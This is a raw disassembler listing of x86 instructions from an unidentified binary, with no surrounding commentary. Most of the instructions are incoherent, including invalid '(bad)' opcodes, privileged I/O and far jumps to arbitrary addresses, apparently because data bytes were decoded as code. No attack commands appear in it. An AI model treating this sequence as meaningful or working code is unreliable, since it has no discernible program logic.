  4293ea:	mov    eax,ds:0x142f5a37
  4293ef:	sar    bh,cl
  4293f1:	sub    BYTE PTR [edx-0x2bdd0c8],ah
  4293f7:	repnz cs jecxz 0x4293e4
  4293fb:	hlt    
  4293fc:	pop    esi
  4293fd:	jno    0x429410
  4293ff:	dec    esi
  429400:	mov    ch,0x4f
  429402:	mov    bl,0x99
  429404:	inc    eax
  429405:	adc    ecx,edx
  429407:	(bad)  
  429408:	mov    al,ds:0xfc597ec4
  42940d:	mov    esp,0xd4ef0d50
  429412:	aad    0xbb
  429414:	inc    eax
  429415:	or     DWORD PTR [esi-0x73575d43],ecx
  42941b:	pop    ebx
  42941c:	out    0x8e,eax
  42941e:	shl    BYTE PTR ds:0x5f413793,cl
  429424:	out    0x4b,al
  429426:	cmp    ecx,DWORD PTR [edx-0x70]
  429429:	es cmp eax,0x54f25735
  42942f:	je     0x42944d
  429431:	dec    esi
  429432:	or     dh,BYTE PTR [edi-0x4bd15fc2]
  429438:	dec    esi
  429439:	invd   
  42943b:	inc    ecx
  42943c:	and    ah,ch
  42943e:	cmp    ch,BYTE PTR [esi]
  429440:	or     DWORD PTR [eax+0x63ff526],edi
  429446:	cli    
  429447:	dec    edx
  429448:	mov    dl,0x45
  42944a:	jne    0x4293db
  42944c:	sar    ebp,0xb6
  42944f:	cs jbe 0x4294b0
  429452:	xor    dl,BYTE PTR [ecx-0x20]
  429455:	rcl    ah,0x9d
  429458:	test   bl,bh
  42945a:	or     cl,BYTE PTR [ebx+0x41]
  42945d:	adc    edx,DWORD PTR [eax+0x78]
  429460:	push   esp
  429461:	sbb    BYTE PTR cs:[ecx],bh
  429464:	pusha  
  429465:	das    
  429466:	ins    BYTE PTR es:[edi],dx
  429467:	lods   al,BYTE PTR ds:[esi]
  429468:	pop    esi
  429469:	mov    al,dh
  42946b:	pop    ds
  42946c:	call   0x92f:0xd07483d9
  429473:	and    bh,ch
  429475:	ja     0x42948e
  429477:	mov    ds:0x4f3c1a7,al
  42947c:	mov    esp,0xf2ec332d
  429481:	pop    edi
  429482:	add    al,0x92
  429484:	loop   0x42949d
  429486:	and    DWORD PTR [ebp-0x27],0x8dd5b8b8
  42948d:	aam    0x6b
  42948f:	and    esp,ecx
  429491:	jbe    0x4294d5
  429493:	inc    ecx
  429494:	pop    edi
  429495:	mov    ebp,0x4031ae6
  42949a:	minps  xmm0,XMMWORD PTR [esi+0x22]
  42949e:	mov    bl,0xb1
  4294a0:	xor    al,BYTE PTR [ebp+edx*8+0x1]
  4294a4:	lahf   
  4294a5:	pop    eax
  4294a6:	outs   dx,BYTE PTR ds:[esi]
  4294a7:	sub    al,0x1
  4294a9:	mov    al,0x1f
  4294ab:	mov    edx,0x4dbabd3e
  4294b0:	mov    cl,0xa4
  4294b2:	out    dx,eax
  4294b3:	rcr    DWORD PTR [ecx+esi*1+0x5b],cl
  4294b7:	cs leave 
  4294b9:	lds    esi,FWORD PTR [ebp+ebx*1+0x494c71e]
  4294c0:	and    eax,0xf9
	...
  429531:	add    BYTE PTR [eax],al
  429533:	add    BYTE PTR [ecx-0xa],dl
  429536:	xor    eax,0x5bffb73e
  42953b:	(bad)  
  42953c:	std    
  42953d:	cmp    eax,0xeb2c4f3
  429542:	bound  ecx,QWORD PTR ss:[eax]
  429545:	mov    bh,0x1
  429547:	add    dh,dh
  429549:	add    BYTE PTR [eax],al
  42954b:	add    bh,ch
  42954d:	mov    ah,0x87
  42954f:	inc    eax
  429550:	ficom  WORD PTR [eax]
  429552:	jg     0x4295b1
  429554:	call   0xfa6c5b25
  429559:	int3   
  42955a:	cmc    
  42955b:	mov    esi,0x9128bfd6
  429560:	push   es
  429561:	fucomip st,st(2)
  429563:	mov    esi,0x5d29efac
  429568:	xor    DWORD PTR [ebp+0x3e539fd2],0x1d
  42956f:	loopne 0x429570
  429571:	jnp    0x429584
  429573:	jmp    0xcee34cd
  429578:	push   ebx
  429579:	es and al,0x89
  42957c:	push   edi
  42957d:	js     0x429573
  42957f:	dec    esi
  429580:	rcl    DWORD PTR [ebp+0x722e39f1],1
  429586:	inc    ebx
  429587:	mov    dl,0xa3
  429589:	(bad)  
  42958a:	or     WORD PTR [ebx+0x1fbef8c],dx
  429591:	sub    eax,0x70f1da82
  429596:	shl    BYTE PTR [eax-0x67884a44],1
  42959c:	push   es
  42959d:	inc    edi
  42959e:	pop    eax
  42959f:	arpl   bp,cx
  4295a1:	cmc    
  4295a2:	in     eax,dx
  4295a3:	clc    
  4295a4:	add    eax,DWORD PTR ds:0x8bceecae
  4295aa:	mov    edi,0xf1d36df9
  4295af:	xor    ecx,DWORD PTR [eax+edx*2-0x5b]
  4295b3:	js     0x4295c6
  4295b5:	xchg   esp,eax
  4295b6:	cmp    BYTE PTR [edi],dh
  4295b8:	loop   0x42962a
  4295ba:	sar    ch,0x46
  4295bd:	sub    DWORD PTR [ecx+0x79011f50],0xffffffd9
  4295c4:	xor    BYTE PTR [edi],dh
  4295c6:	fnstsw WORD PTR ss:[eax+0x5f]
  4295ca:	inc    edx
  4295cb:	pop    ebx
  4295cc:	and    al,0xfb
  4295ce:	sti    
  4295cf:	adc    DWORD PTR [edx-0x56],edi
  4295d2:	stos   BYTE PTR es:[edi],al
  4295d3:	and    BYTE PTR [ecx+0x30],0x38
  4295d7:	in     al,dx
  4295d8:	out    0x5a,al
  4295da:	or     al,0xbd
  4295dc:	test   DWORD PTR [edi+0x41],edi
  4295df:	mov    DWORD PTR ds:0x33c66007,ebx
  4295e5:	sbb    BYTE PTR [edx+esi*2-0x4ad2b9e2],dl
  4295ec:	sbb    edx,DWORD PTR [ebp+0x45]
  4295ef:	test   DWORD PTR [esi],edi
  4295f1:	adc    al,0xe2
  4295f3:	jg     0x4295b4
  4295f5:	mov    esi,0x9aeb0c8c
  4295fa:	mov    cl,cl
  4295fc:	adc    eax,0xc640b82c
  429601:	jb     0x42963a
  429603:	test   dl,0x3c
  429606:	mov    ebp,esi
  429608:	mov    ebx,0x479cf9c8
  42960d:	shl    dl,0x11
  429610:	sub    al,0xec
  429612:	inc    eax
  429613:	lahf   
  429614:	push   esi
  429615:	lss    eax,FWORD PTR [ebp+0x723a609f]
  42961c:	test   ax,0xfcdc
  429620:	xor    ebp,DWORD PTR [edx-0x7d]
  429623:	aas    
  429624:	(bad)  
  429626:	(bad)  
  429627:	aad    0x24
  429629:	jb     0x4295eb
  42962b:	sbb    esi,DWORD PTR [eax+0x1b]
  42962e:	in     al,0xf2
  429630:	sub    al,BYTE PTR [eax+0x5a16130a]
  429636:	or     esp,DWORD PTR [eax]
  429638:	pop    ss
  429639:	les    esp,FWORD PTR [edi]
  42963b:	outs   dx,DWORD PTR ds:[esi]
  42963c:	and    al,0x37
  42963e:	cmp    DWORD PTR [edi+0x42],ecx
  429641:	add    BYTE PTR [eax],0x0
	...
  4296b4:	push   esi
  4296b5:	pop    ebx
  4296b6:	xor    al,0x78
  4296b8:	cmp    eax,0x737f5e7f
  4296bd:	ficom  DWORD PTR [ecx+0x4f]
  4296c0:	mov    dh,0x6d
  4296c2:	pop    es
  4296c3:	xchg   esi,edi
  4296c5:	mov    bh,0x1
  4296c7:	add    dh,dh
  4296c9:	add    BYTE PTR [eax],al
  4296cb:	add    BYTE PTR [ebx-0x42],dh
  4296ce:	dec    eax
  4296cf:	cdq    
  4296d0:	in     al,0x28
  4296d2:	ret    0x4a95
  4296d5:	sub    eax,esi
  4296d7:	xchg   edi,eax
  4296d8:	cli    
  4296d9:	or     eax,0xd7d7fe55
  4296de:	je     0x429745
  4296e0:	retf   0x777d
  4296e3:	jge    0x4296af
  4296e5:	test   eax,0x73b8777e
  4296ea:	out    0x0,al
  4296ec:	dec    edx
  4296ed:	int    0x4e
  4296ef:	cmc    
  4296f0:	popa   
  4296f1:	pop    edx
  4296f2:	xchg   edi,eax
  4296f3:	rol    BYTE PTR [ecx],1
  4296f5:	int3   
  4296f6:	and    BYTE PTR [edi+0x69],0x26
  4296fa:	clc    
  4296fb:	fisttp QWORD PTR [esi+ebx*4]
  4296fe:	mov    dl,0xf6
  429700:	pop    esp
  429701:	xor    esi,DWORD PTR [ecx+0x16eb64a8]
  429707:	or     eax,0xbe21c4c5
  42970c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42970d:	mov    eax,0x18dc7ec0
  429712:	cld    
  429713:	adc    BYTE PTR [ecx],dl
  429715:	push   ss
  429716:	dec    ebx
  429717:	mov    DWORD PTR [edx],esi
  429719:	nop
  42971a:	pusha  
  42971b:	push   ebp
  42971c:	jno    0x429751
  42971e:	dec    edi
  42971f:	push   edx
  429720:	les    edx,FWORD PTR [ebx-0x168a32d7]
  429726:	call   0x23db:0x2b105625
  42972d:	dec    eax
  42972e:	ret    
  42972f:	stos   BYTE PTR es:[edi],al
  429730:	fwait
  429731:	leave  
  429732:	sahf   
  429733:	and    al,cl
  429735:	out    dx,eax
  429736:	jmp    0xbea5:0x6bcf7291
  42973d:	mov    WORD PTR [eax],fs
  42973f:	sub    BYTE PTR [edi+0x1698391e],ah
  429745:	or     BYTE PTR [eax],0x3a
  429748:	or     edx,DWORD PTR [ebx]
  42974a:	rol    dl,cl
  42974c:	adc    ch,ch
  42974e:	mov    al,ds:0xabf9904f
  429753:	retf   0xd5a2
  429756:	mov    edx,0x5f5c5d68
  42975b:	pop    ds
  42975c:	pop    ecx
  42975d:	leave  
  42975e:	and    BYTE PTR [ebp+0x5d],al
  429761:	sti    
  429762:	jmp    0xe177b657
  429767:	je     0x42973a
  429769:	xor    esi,DWORD PTR [edi-0x56]
  42976c:	jno    0x4296f8
  42976e:	les    ebp,FWORD PTR [ebx]
  429770:	mov    ah,bl
  429772:	sbb    BYTE PTR [eax+0x7d],dh
  429775:	cdq    
  429776:	xchg   edi,eax
  429777:	cmp    eax,ebp
  429779:	xchg   ebp,eax
  42977a:	mov    WORD PTR [edi+0x2],fs
  42977d:	hlt    
  42977e:	cmp    al,0x52
  429780:	jl     0x42979e
  429782:	ror    BYTE PTR [eax-0x5c],1
  429785:	and    eax,0x1c4b4b5b
  42978a:	dec    BYTE PTR [ebx+0x30690d39]
  429790:	retf   
  429791:	adc    BYTE PTR [eax-0x2e],bl
  429794:	push   edi
  429795:	mov    BYTE PTR [ebx],cl
  429797:	int3   
  429798:	xor    cl,BYTE PTR [ebp+0x1b]
  42979b:	call   0x37f5:0x65cd8b0b
  4297a2:	xchg   edi,eax
  4297a3:	jbe    0x429786
  4297a5:	in     eax,dx
  4297a6:	push   esp
  4297a7:	mov    eax,ds:0x6e5f4ab1
  4297ac:	(bad)  
  4297ad:	push   ss
  4297ae:	arpl   WORD PTR [ecx],dx
  4297b0:	sar    BYTE PTR [ebx],cl
  4297b2:	call   0xc2012ba2
  4297b7:	adc    edx,DWORD PTR [ecx+edx*4-0x3f]
  4297bb:	dec    eax
  4297bc:	lods   eax,DWORD PTR ds:[esi]
  4297bd:	retf   
  4297be:	pop    ss
  4297bf:	iret   
  4297c0:	jecxz  0x42979d
	...
  429832:	add    BYTE PTR [eax],al
  429834:	es jp  0x4298a8
  429837:	les    edi,FWORD PTR [ebp-0x31]
  42983a:	mov    bh,0xfa
  42983c:	push   0xffffffa8
  42983e:	push   es
  42983f:	adc    DWORD PTR [ecx-0xb3e35b1],edx
  429845:	mov    eax,0xf60001
  42984a:	add    BYTE PTR [eax],al
  42984c:	popf   
  42984d:	sub    eax,0x1654ac58
  429852:	(bad)  
  429853:	sub    eax,edx
  429855:	cdq    
  429856:	add    ebx,esi
  429858:	call   0x9ad6:0x2c53de29
  42985f:	pop    eax
  429860:	mov    bl,0xf8
  429862:	sbb    DWORD PTR [ecx],edi
  429864:	ret    
  429865:	mov    ch,0xf6
  429867:	retf   0x553
  42986a:	stos   DWORD PTR es:[edi],eax
  42986b:	add    edi,edx
  42986d:	loopne 0x42985f
  42986f:	test   eax,0x3cc7e1c3
  429874:	dec    ebp
  429875:	lods   al,BYTE PTR ds:[esi]
  429876:	cmp    DWORD PTR [edx+eax*1+0x38],0x81a9ec95
  42987e:	les    esp,FWORD PTR [edx*1+0x3b7d92dd]
  429885:	sub    DWORD PTR [ebx+0x48],eax
  429888:	ficomp WORD PTR [ebp+esi*2+0x6f]
  42988c:	iret   
  42988d:	add    al,0x15
  42988f:	and    eax,edx
  429891:	mov    dh,0xb1
  429893:	mov    eax,ds:0x3ef249c4
  429898:	mov    eax,DWORD PTR [ebp-0x72b4dffb]
  42989e:	cmp    esi,DWORD PTR [esp+ecx*1-0x425f6d35]
  4298a5:	test   eax,0xc5c5f5ae
  4298aa:	mov    ds:0x2ffaa6b4,eax
  4298af:	sub    ch,BYTE PTR [edx-0x2f]
  4298b2:	dec    eax
  4298b3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4298b4:	lock repz mov edx,0xc935c15d
  4298bb:	and    bh,0x7d
  4298be:	sbb    ah,BYTE PTR [ebx]
  4298c0:	pop    ebp
  4298c1:	mov    al,0x33
  4298c3:	inc    ebp
  4298c4:	inc    ecx
  4298c5:	jl     0x429933
  4298c7:	ret    0xcd32
  4298ca:	mov    edx,DWORD PTR [ecx+0x75ff5d3c]
  4298d0:	inc    esp
  4298d1:	int3   
  4298d2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4298d3:	xor    eax,0xc82914b2
  4298d8:	repz pop ds
  4298da:	call   FWORD PTR [ebx+ebx*2+0x33b51e60]
  4298e1:	jmp    0x610b17d9
  4298e6:	sub    DWORD PTR [edi],0x46
  4298e9:	ds jle 0x429875
  4298ec:	push   edx
  4298ed:	mov    eax,ds:0xb6099aa
  4298f2:	mov    ds:0xc1944b2b,al
  4298f7:	jmp    0xf81b85e3
  4298fc:	push   edx
  4298fd:	cwde   
  4298fe:	mov    eax,ds:0x1670ce7d
  429903:	push   ebp
  429904:	pushf  
  429905:	pop    eax
  429907:	sti    
  429908:	sbb    BYTE PTR [esi-0x2f2d0f60],bh
  42990e:	or     ah,bh
  429910:	into   
  429911:	mov    edx,eax
  429913:	aas    
  429914:	outs   dx,BYTE PTR ds:[esi]
  429915:	cli    
  429916:	in     al,0xb0
  429918:	scas   eax,DWORD PTR es:[edi]
  429919:	xchg   ebp,eax
  42991a:	ds xchg ebx,eax
  42991c:	frstor [ecx]
  42991e:	dec    esp
  42991f:	adc    dh,ah
  429921:	jg     0x4298fb
  429923:	test   al,0x10
  429925:	fs js  0x429968
  429928:	mov    ecx,0x4057b3d8
  42992d:	loope  0x4298cd
  42992f:	inc    ebx
  429930:	dec    eax
  429931:	add    DWORD PTR [eax+0x1e],0xffffffcd
  429935:	mov    dh,0xef
  429937:	push   es
  429938:	inc    ecx
  429939:	adc    eax,0x24ab7729
  42993e:	xor    BYTE PTR [ecx+0x7c],dh
  429941:	in     al,0x0
	...
  4299b3:	add    BYTE PTR [ebp+0xc],cl
  4299b6:	clc    
  4299b7:	pop    ebx
  4299b8:	stc    
  4299b9:	(bad)  
  4299ba:	out    dx,eax
  4299bb:	push   ds
  4299bc:	ins    BYTE PTR es:[edi],dx
  4299bd:	xchg   ecx,eax
  4299be:	cld    
  4299bf:	sub    DWORD PTR [eax-0x15cb8269],esp
  4299c5:	mov    ecx,0xf60001
  4299ca:	add    BYTE PTR [eax],al
  4299cc:	rcl    BYTE PTR [eax-0x7a],1
  4299cf:	pop    es
  4299d0:	dec    ecx
  4299d1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4299d2:	lds    esi,FWORD PTR [edi-0x28]
  4299d5:	cmc    
  4299d6:	(bad)  
  4299d7:	fild   DWORD PTR [ebx-0x1f0c5bae]
  4299dd:	clc    
  4299de:	xchg   esp,eax
  4299df:	dec    ebp
  4299e0:	inc    ecx
  4299e1:	ret    0xe412
  4299e4:	loop   0x429a53
  4299e6:	gs mov ecx,0x1db9b6e8
  4299ec:	mov    ax,ds:0xeead4d1f
  4299f2:	jb     0x4299dd
  4299f4:	ret    0xe625
  4299f7:	icebp  
  4299f8:	xchg   ebp,eax
  4299f9:	xor    BYTE PTR [eax],dl
  4299fb:	inc    edi
  4299fc:	shl    cl,1
  4299fe:	bound  ebp,QWORD PTR [ecx]
  429a00:	stos   BYTE PTR es:[edi],al
  429a01:	push   ebx
  429a02:	retf   
  429a03:	mov    edx,0x83c5aa68
  429a08:	lea    esp,[eax-0x47]
  429a0b:	jno    0x429a23
  429a0d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  429a0e:	out    0x5b,eax
  429a10:	cmp    ah,BYTE PTR [eax+0x68]
  429a13:	and    ebp,DWORD PTR [ebp+0x3dd14caa]
  429a19:	orps   xmm3,xmm4
  429a1c:	mov    eax,DWORD PTR [edx+ebp*8+0x747e4086]
  429a23:	and    BYTE PTR [eax-0x135c2bb4],ch
  429a29:	ret    
  429a2a:	or     BYTE PTR [edi+eiz*8-0x25],0xca
  429a2f:	dec    ebp
  429a30:	mov    WORD PTR [eax],?
  429a32:	aas    
  429a33:	iret   
  429a34:	stc    
  429a35:	ret    
  429a36:	mov    ch,0x75
  429a38:	inc    esi
  429a39:	lock stc 
  429a3b:	pop    ss
  429a3c:	xor    ch,bl
  429a3e:	repnz movzx ebx,BYTE PTR [edx]
  429a42:	and    eax,0x4a282a6a
  429a47:	or     eax,0xc1dfa97a
  429a4c:	(bad)  
  429a4d:	adc    cl,cl
  429a4f:	fist   DWORD PTR [edi-0x7e1a2a8f]
  429a55:	outs   dx,DWORD PTR ds:[esi]
  429a56:	sbb    DWORD PTR [esi+edi*8-0x16],eax
  429a5a:	mov    bl,0x24
  429a5c:	mov    ecx,DWORD PTR [edx]
  429a5e:	jge    0x429a53
  429a60:	pop    ecx
  429a61:	add    esi,DWORD PTR [edi+eiz*1-0x65]
  429a65:	dec    ebp
  429a66:	inc    edi
  429a67:	pop    ecx
  429a68:	sub    al,0x72
  429a6a:	(bad)  
  429a6c:	ret    0x668d
  429a6f:	in     al,0x1d
  429a71:	xchg   BYTE PTR [esp+edi*2],ch
  429a74:	aad    0xe6
  429a76:	xchg   edi,eax
  429a77:	mov    bh,bl
  429a79:	cmp    eax,0x821448c5
  429a7e:	ffree  st(5)
  429a80:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  429a81:	jmp    0x4198dfdd
  429a86:	sti    
  429a87:	jl     0x429a23
  429a89:	push   ecx
  429a8a:	pop    ebp
  429a8b:	aad    0x70
  429a8d:	pushf  
  429a8e:	xor    DWORD PTR [edx+0x5efe0878],esp
  429a94:	repnz in al,dx
  429a96:	mov    bh,0xea
  429a98:	inc    eax
  429a99:	and    BYTE PTR [esi-0x2e],ah
  429a9c:	les    esi,FWORD PTR [ebp-0x1e]
  429a9f:	leave  
  429aa0:	mov    dh,0x21
  429aa2:	sbb    al,0xd3
  429aa4:	jp     0x429b21
  429aa6:	sti    
  429aa7:	into   
  429aa8:	cmc    
  429aa9:	or     DWORD PTR [edi],0x2b
  429aac:	rcl    BYTE PTR [ebp+0x492beab2],cl
  429ab2:	add    ecx,DWORD PTR [esi+eax*4+0x20]
  429ab6:	lea    edi,[ecx]
  429ab8:	gs jl  0x429b13
  429abb:	mov    ebx,0xa8c8795c
  429ac0:	xchg   BYTE PTR [ebp+0x0],ch
	...
  429b32:	add    BYTE PTR [eax],al
  429b34:	lds    edx,FWORD PTR [ebp-0x76]
  429b37:	cli    
  429b38:	call   0xe133:0xa97ff5ff
  429b3f:	ret    0x6e72
  429b42:	shr    BYTE PTR [ecx+0x1bae0],0xf6
  429b49:	add    BYTE PTR [eax],al
  429b4b:	add    BYTE PTR [edx],ah
  429b4d:	lods   al,BYTE PTR ds:[esi]
  429b4e:	sub    edx,ebx
  429b50:	nop
  429b51:	sub    al,0xd0
  429b53:	jne    0x429af0
  429b55:	sub    eax,0xf0aaee61
  429b5a:	mov    DWORD PTR [esi],0xecf55739
  429b60:	cmp    DWORD PTR [eax],0x16
  429b63:	popa   
  429b64:	leave  
  429b65:	lsl    esi,WORD PTR [ebx-0x7d]
  429b69:	ja     0x429b1b
  429b6b:	iret   
  429b6c:	jbe    0x429bb6
  429b6e:	push   es
  429b6f:	stc    
  429b70:	pop    edi
  429b71:	fiadd  WORD PTR [edi]
  429b73:	add    dl,BYTE PTR [ecx+0x3f8e463e]
  429b79:	inc    esp
  429b7a:	out    0x82,al
  429b7c:	xchg   ebp,eax
  429b7d:	and    bh,dl
  429b7f:	retf   
  429b80:	dec    edi
  429b81:	mov    cl,0xcb
  429b83:	pop    esi
  429b84:	dec    eax
  429b85:	mov    ah,bl
  429b87:	inc    edi
  429b88:	fcmovnb st,st(5)
  429b8a:	jle    0x429b62
  429b8c:	imul   esi,DWORD PTR [esi-0x5145d89a],0xf4943ccd
  429b96:	add    eax,0x5ab82de1
  429b9b:	and    eax,0x47b22188
  429ba0:	mov    edi,DWORD PTR [eax+eiz*4-0x246a1f1d]
  429ba7:	jo     0x429ba6
  429ba9:	mov    ds:0x4dc9562c,al
  429bae:	ss in  eax,dx
  429bb0:	adc    dl,dl
  429bb2:	jno    0x429bf6
  429bb4:	jno    0x429bf3
  429bb6:	sub    eax,0xf10e5a
  429bbb:	cmp    BYTE PTR [ecx],bl
  429bbd:	lds    ebx,FWORD PTR [eax+0x5f]
  429bc0:	sbb    BYTE PTR [esi+edx*1],dl
  429bc3:	into   
  429bc4:	pop    esi
  429bc5:	int3   
  429bc6:	push   ebp
  429bc7:	jecxz  0x429b4d
  429bc9:	push   0xf1cd35f2
  429bce:	repz daa 
  429bd0:	sub    edx,ebx
  429bd2:	bound  ecx,QWORD PTR [esi]
  429bd4:	leave  
  429bd5:	fild   DWORD PTR [edx-0x8b67ada]
  429bdb:	ja     0x429bce
  429bdd:	adc    ebp,edi
  429bdf:	adc    DWORD PTR [edi-0x19],0xa
  429be3:	ret    0x7e7b
  429be6:	mov    al,0xd4
  429be8:	bound  ebp,QWORD PTR ds:0x351b7a32
  429bee:	ret    0x451b
  429bf1:	imul   ecx,DWORD PTR [edx-0x348bb739],0x280ca33d
  429bfb:	push   eax
  429bfc:	jb     0x429c0c
  429bfe:	and    al,0x51
  429c00:	pop    esi
  429c01:	(bad)  
  429c02:	pusha  
  429c03:	test   al,0x60
  429c05:	sbb    BYTE PTR [edx+0x50b1aab6],dh
  429c0b:	sub    eax,0x6c41d6e2
  429c10:	sub    DWORD PTR [esp+ecx*8-0x57],esp
  429c14:	jp     0x429bbc
  429c16:	mov    ch,0x35
  429c18:	pop    edi
  429c19:	mov    ds:0xa61e94dc,eax
  429c1e:	dec    ebx
  429c1f:	jle    0x429c3c
  429c21:	daa    
  429c22:	sub    BYTE PTR [esi-0x17],dh
  429c25:	pop    ecx
  429c26:	push   0xa9e0b9b9
  429c2b:	jmp    0x301e8891
  429c30:	dec    ecx
  429c31:	shl    DWORD PTR [ebx+ebp*2],1
  429c34:	inc    cl
  429c36:	mov    WORD PTR [eax-0x7309174],?
  429c3c:	sub    BYTE PTR [eax],al
  429c3e:	cmp    BYTE PTR [edx+0x405b],al
	...
  429cb4:	xor    DWORD PTR [ebp+0x75f531f1],0xd7dfb5c1
  429cbe:	ins    BYTE PTR es:[edi],dx
  429cbf:	scas   al,BYTE PTR es:[edi]
  429cc0:	xor    DWORD PTR [edx],0xbbd6b53f
  429cc6:	add    DWORD PTR [eax],eax
  429cc8:	test   BYTE PTR [eax],0x0
  429ccb:	add    BYTE PTR [ebx],cl
  429ccd:	test   al,0x3e
  429ccf:	stos   BYTE PTR es:[edi],al
  429cd0:	or     ebp,edi
  429cd2:	mov    bl,0xf3
  429cd4:	ror    DWORD PTR [eax-0x4e49ab3a],0xae
  429cdb:	pop    edi
  429cdc:	out    0xa6,al
  429cde:	jmp    0x8b81c7f
  429ce3:	lods   eax,DWORD PTR ds:[esi]
  429ce4:	pop    ss
  429ce5:	sbb    BYTE PTR [ebx+0x7566010b],bh
  429ceb:	mov    bl,0x5b
  429ced:	push   ds
  429cee:	mov    eax,0x2a79624c
  429cf3:	sub    BYTE PTR [edi+0x7673ae5],bh
  429cf9:	and    ah,BYTE PTR [eax-0x1c]
  429cfc:	fld    QWORD PTR ds:0x59c4a18b
  429d02:	jbe    0x429d1c
  429d04:	xchg   edx,eax
  429d05:	cwde   
  429d06:	jae    0x429d3d
  429d08:	inc    esi
  429d09:	jmp    0x429d70
  429d0b:	sub    BYTE PTR [esp+esi*8-0x27f4fb2b],bl
  429d12:	test   eax,0x7599cf47
  429d17:	xchg   BYTE PTR [edi*8+0x376f18e6],al
  429d1e:	jnp    0x429cd3
  429d20:	out    0x5e,al
  429d22:	xchg   esp,eax
  429d23:	xchg   edx,eax
  429d24:	shl    DWORD PTR [edx],cl
  429d26:	sbb    al,0xb1
  429d28:	imul   edx,DWORD PTR [esi+0x492ab97a],0xb0e82388
  429d32:	and    esp,esi
  429d34:	aam    0x31
  429d36:	jo     0x429d79
  429d38:	or     bh,BYTE PTR [ebx]
  429d3a:	adc    BYTE PTR [ebx-0x5b],bh
  429d3d:	test   al,0xb7
  429d3f:	dec    ebp
  429d40:	add    al,BYTE PTR [edi+eax*4+0x61]
  429d44:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  429d45:	retf   
  429d46:	sub    eax,eax
  429d48:	(bad)  
  429d49:	bound  edx,QWORD PTR [ebx]
  429d4b:	mov    ecx,0xc0c5b825
  429d50:	cmp    cl,BYTE PTR [esp+esi*2-0x1f2b289d]
  429d57:	imul   edi,DWORD PTR ss:[esi],0xc4f4a90c
  429d5e:	fmul   QWORD PTR [ebx+0x15]
  429d61:	lods   al,BYTE PTR ds:[esi]
  429d62:	(bad)  
  429d64:	fsubr  st(4),st
  429d66:	je     0x429d51
  429d68:	(bad)
  429d6b:	repz pop edi
  429d6d:	inc    edi
  429d6e:	add    al,0x65
  429d70:	adc    BYTE PTR [ecx+0x18],0xd5
  429d74:	es push ecx
  429d76:	dec    esi
  429d77:	sar    DWORD PTR [edx+0x59],cl
  429d7a:	xchg   ebp,eax
  429d7b:	ins    BYTE PTR es:[edi],dx
  429d7c:	ins    BYTE PTR es:[edi],dx
  429d7d:	fimul  DWORD PTR [ebx+0x4d]
  429d80:	shl    BYTE PTR [esi+0x56f3724f],cl
  429d86:	sub    al,0x4d
  429d88:	jg     0x429d81
  429d8a:	mov    ebp,0xe6eb7bbf
  429d8f:	lahf   
  429d90:	mov    eax,ds:0x582af482
  429d95:	retf   
  429d96:	mov    bl,0x4e
  429d98:	hlt    
  429d99:	push   esi
  429d9a:	push   edi
  429d9b:	adc    eax,0xc52c88c8
  429da0:	(bad)  [eax]
  429da2:	inc    ecx
  429da3:	xchg   ebx,eax
  429da4:	repz pop esp
  429da6:	jecxz  0x429dd6
  429da8:	jle    0x429d57
  429daa:	sub    BYTE PTR [edx],cl
  429dac:	out    dx,al
  429dad:	pop    ss
  429dae:	nop
  429daf:	or     ecx,esi
  429db1:	leave  
  429db2:	fnstcw WORD PTR [edx+0x1cdd0f94]
  429db8:	jle    0x429d8e
  429dba:	mov    ebx,0x1c63d3d7
  429dbf:	cmp    BYTE PTR [ebp+0x63],ch
	...
  429e31:	add    BYTE PTR [eax],al
  429e33:	add    BYTE PTR [edi+0x5d],cl
  429e36:	pop    ecx
  429e37:	sbb    DWORD PTR [ebx-0x79],0xffffffdf
  429e3b:	fstp   QWORD PTR [eax+0x124e2ee0]
  429e41:	mov    al,0xb2
  429e43:	sub    ecx,esp
  429e45:	mov    esp,0xf60001
  429e4a:	add    BYTE PTR [eax],al
  429e4c:	pop    ds
  429e4d:	pushf  
  429e4e:	and    al,0x33
  429e50:	addr16 xchg ecx,eax
  429e52:	out    dx,al
  429e53:	dec    edx
  429e54:	imul   edi,DWORD PTR [eax+0x57],0x8427e0f5
  429e5b:	xor    ecx,DWORD PTR [ebx+ebx*2]
  429e5e:	sti    
  429e5f:	jmp    0x429e43
  429e61:	sbb    DWORD PTR [edi],0x45
  429e64:	xor    bh,BYTE PTR [esi-0xf]
  429e67:	jge    0x429e31
  429e69:	(bad)  
  429e6a:	jno    0x429dfd
  429e6c:	mov    esi,0xea71e248
  429e71:	xchg   edi,eax
  429e72:	or     eax,0xbd09ba07
  429e77:	cbw    
  429e79:	fsub   DWORD PTR [edx+edx*4-0x78]
  429e7d:	pop    edi
  429e7e:	fld    QWORD PTR gs:[eax+0x4d]
  429e82:	mov    ss,ebx
  429e84:	adc    al,0xa8
  429e86:	fs xchg esi,eax
  429e88:	or     dh,BYTE PTR [ecx+eiz*4-0x71f95da6]
  429e8f:	(bad)  
  429e91:	sub    DWORD PTR [edx+edx*8-0xbbc91e4],ebp
  429e98:	rcl    DWORD PTR [eax-0x14f0db60],1
  429e9e:	mul    dl
  429ea0:	nop
  429ea1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  429ea2:	push   ebx
  429ea3:	call   FWORD PTR [ebx+0x699b86d4]
  429ea9:	xor    al,BYTE PTR [edx]
  429eab:	dec    ebx
  429eac:	popf   
  429ead:	lock add ebp,DWORD PTR [edx]
  429eb0:	gs jl  0x429f0d
  429eb3:	cli    
  429eb4:	scas   eax,DWORD PTR es:[edi]
  429eb5:	inc    edx
  429eb6:	pushf  
  429eb7:	or     BYTE PTR [ebx-0x74],al
  429eba:	xchg   esp,eax
  429ebb:	push   esp
  429ebc:	xchg   esp,eax
  429ebd:	adc    DWORD PTR [ebx+0x21],ebp
  429ec0:	pop    esi
  429ec1:	jl     0x429e90
  429ec3:	ret    0xf9c2
  429ec6:	or     DWORD PTR [edi+0x7ad8493f],esi
  429ecc:	or     BYTE PTR [ebx],cl
  429ece:	out    0xe2,eax
  429ed0:	adc    ebx,esi
  429ed2:	in     al,0x2c
  429ed4:	stos   BYTE PTR es:[edi],al
  429ed5:	sbb    BYTE PTR [ebx],al
